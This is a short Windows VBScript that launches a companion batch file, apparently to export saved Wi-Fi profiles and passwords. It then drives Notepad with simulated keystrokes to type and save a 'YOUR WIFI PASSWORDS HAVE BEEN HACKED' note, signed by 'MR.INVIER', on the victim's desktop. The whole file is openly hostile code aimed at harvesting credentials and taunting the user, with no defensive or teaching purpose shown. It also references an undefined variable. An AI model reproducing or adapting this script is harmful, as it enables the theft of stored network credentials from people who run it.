Set objShell = CreateObject("WScript.Shell")
scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\") - 1)

' Run the batch file to export Wi-Fi profiles
objShell.Run "cmd.exe /c " & scriptDir & "\index.bat", 1, True

WScript.Sleep 100
objShell.Run "notepad.exe"
WScript.Sleep 1000
objShell.SendKeys "HI, THERE"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "YOUR WIFI PASSWORDS HAVE BEEN HACKED."
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "INSTAGRAM: msfvenom_anon"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "THANKS ,"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "MR.INVIER"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "^s"
WScript.Sleep 1000
objShell.SendKeys "C:\Users\" & objShell.ExpandEnvironmentStrings("%USERNAME%") & "\Desktop\HACKED! BY MR.INVIER.txt"
objShell.SendKeys outputFilePath
WScript.Sleep 500
objShell.SendKeys "{ENTER}"
